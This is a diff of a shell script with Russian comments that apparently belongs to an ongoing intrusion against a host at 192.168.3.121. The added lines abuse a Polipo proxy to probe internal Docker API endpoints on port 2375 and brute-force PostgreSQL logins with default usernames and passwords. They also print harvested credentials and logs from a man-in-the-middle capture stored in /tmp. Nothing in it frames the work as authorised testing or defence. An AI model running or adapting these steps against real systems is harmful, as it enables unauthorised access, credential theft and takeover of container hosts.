@@ -1,18 +1,35 @@
-echo "=== OPENAPI SPEC ==="
-wget -q -T 10 -O /tmp/oapi.json "http://192.168.3.121:8000/openapi.json" 2>/dev/null
+echo "=== POLIPO → DOCKER NETWORK ==="
 python3 -c "
-import json
-d=json.load(open('/tmp/oapi.json'))
-print('TITLE:',d.get('info',{}).get('title',''))
-print('VERSION:',d.get('info',{}).get('version',''))
-print()
-for path,methods in d.get('paths',{}).items():
-    for m,spec in methods.items():
-        print(f'{m.upper():7s} {path} - {spec.get("summary",spec.get("description",""))[:60]}')
-print()
-print('SERVERS:',d.get('servers',[]))
-" 2>/dev/null
-echo "=== CMS ROOT ==="
-wget -q -T 5 -O - "http://192.168.3.121:8000/" 2>/dev/null | head -c 200
-echo
-echo OAPI
+import urllib.request
+# Polipo прокси на hung1 → пробуем внутренние Docker сервисы
+proxy='http://192.168.3.121:8123'
+op=urllib.request.build_opener(urllib.request.ProxyHandler({'http':proxy}))
+for target in ['http://172.18.0.1:2375/version','http://172.18.0.8:8000/','http://localhost:2375/version','http://127.0.0.1:2375/version','http://172.17.0.1:2375/version']:
+    try:
+        r=op.open(target,timeout=5)
+        print(target,'→',r.read()[:200])
+    except Exception as e:
+        err=str(e)[:60]
+        if 'Connection refused' not in err and 'timed out' not in err:
+            print(target,'→',err)
+"
+echo "=== PG: коннект с дефолтами ==="
+for U in postgres hung eaera root admin; do
+  for PW in "" "postgres" "hung123" "Password123!"; do
+    R=$(timeout 5 python3 -c "
+import psycopg2
+try:
+    c=psycopg2.connect(host='192.168.3.121',port=5432,user='$U',password='$PW',connect_timeout=3)
+    cur=c.cursor(); cur.execute('SELECT version()')
+    print('OK:',cur.fetchone()[0][:50])
+except Exception as e:
+    pass
+" 2>/dev/null)
+    [ -n "$R" ] && echo "PG $U/$PW: $R" && break 2
+  done
+done
+echo "=== MITM CREDS CHECK ==="
+cat /tmp/creds_new.txt 2>/dev/null | head -10
+cat /tmp/mitm_log.txt 2>/dev/null | tail -3
+ls -la /tmp/mitm3.pcap 2>/dev/null | awk '{print "pcap:",$5,"bytes"}'
+echo POLIPO-DOCKER
